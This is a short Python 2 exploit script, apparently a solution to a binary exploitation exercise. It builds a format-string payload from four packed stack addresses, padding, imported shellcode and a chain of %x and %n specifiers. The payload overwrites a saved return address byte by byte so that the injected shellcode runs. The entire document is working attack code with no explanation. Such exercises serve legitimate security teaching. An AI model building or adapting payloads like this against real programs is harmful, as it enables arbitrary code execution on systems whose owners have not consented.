from shellcode import shellcode
from struct import pack

sh_adr = pack("<I", 0xbffee34c)
ret_addr_stored1 = pack("<I", 0xbffeeb3c) # 00 00 00 XX
ret_addr_stored2 = pack("<I", 0xbffeeb3d) # 00 00 XX 00
ret_addr_stored3 = pack("<I", 0xbffeeb3e) # 00 XX 00 00 
ret_addr_stored4 = pack("<I", 0xbffeeb3f) # XX 00 00 00

print ret_addr_stored1 + "A"*4 + ret_addr_stored2 + "A"*4 + ret_addr_stored3 + "A"*4 + ret_addr_stored4 + shellcode + "%x%x%14x%n%151x%n%27x%n%193x%n"